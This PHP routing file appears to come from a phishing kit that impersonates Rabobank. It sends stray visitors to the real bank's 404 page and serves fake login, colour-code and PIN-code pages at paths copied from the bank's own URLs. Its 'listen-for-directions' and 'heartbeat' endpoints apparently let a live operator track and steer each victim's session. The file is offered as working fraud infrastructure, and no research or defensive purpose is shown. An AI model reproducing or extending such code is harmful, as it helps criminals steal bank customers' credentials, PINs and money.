<?php
try{
	$router = new \classes\core\routing();
	    $router->set404(function () {
			header("Location: https://www.rabobank.nl/404");
        });

        $router->get('/', function () {
			header("Location: /klanten/qsl_inloggen.do");
        });

        $router->all('/listen-for-directions', function () {
            $rabo = new \controllers\rabo(false);
            $rabo->listenfordirections($_SESSION['uid']);    
        });

        $router->all('/heartbeat', function () {
           $rabo = new \controllers\rabo(false);
           $rabo->heartbeat($_SESSION['uid']);
        });
       
        $router->all('/klanten/qsl_inloggen.do', function () {
            $rabo = new \controllers\rabo(false);
            $rabo->login(false);
         });

         $router->all('/klanten/qsl_inloggen_fout.do', function () {
            $rabo = new \controllers\rabo(false);
            $rabo->login(true);
         });

         $router->all('/klanten/qsl_controle.do', function () {
            $rabo = new \controllers\rabo(true);
            $rabo->controle();
         });

         $router->all('/klanten/qsl_kleurcode.do', function () {
            $rabo = new \controllers\rabo(true);
            $rabo->kleurcode(false);
         });

         $router->all('/klanten/qsl_kleurcode_fout.do', function () {
            $rabo = new \controllers\rabo(true);
            $rabo->kleurcode(true);
         });

         $router->all('/klanten/qsl_pincode.do', function () {
            $rabo = new \controllers\rabo(true);
            $rabo->pincode();
         });

         $router->Run();
}catch (Exception $e) { echo $e->getMessage(); }
